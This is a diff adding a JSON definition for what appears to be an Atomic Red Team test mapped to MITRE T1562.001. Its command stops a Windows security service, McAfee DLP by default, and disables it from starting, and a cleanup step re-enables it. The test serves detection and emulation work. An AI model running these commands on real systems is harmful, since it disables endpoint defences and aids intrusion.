@@ -1,0 +1,31 @@
+{
+    "name": "Disable Arbitrary Security Windows Service",
+    "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed. Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service. To verify that the service has stopped, run sc query McAfeeDLPAgentService ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n",
+        "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "a1230893-56ac-4c81-b644-2108e982f8f5",
+    "arguments": {
+        "service_name": {
+            "description": "The name of the service to stop",
+            "type": "string",
+            "default": "McAfeeDLPAgentService"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
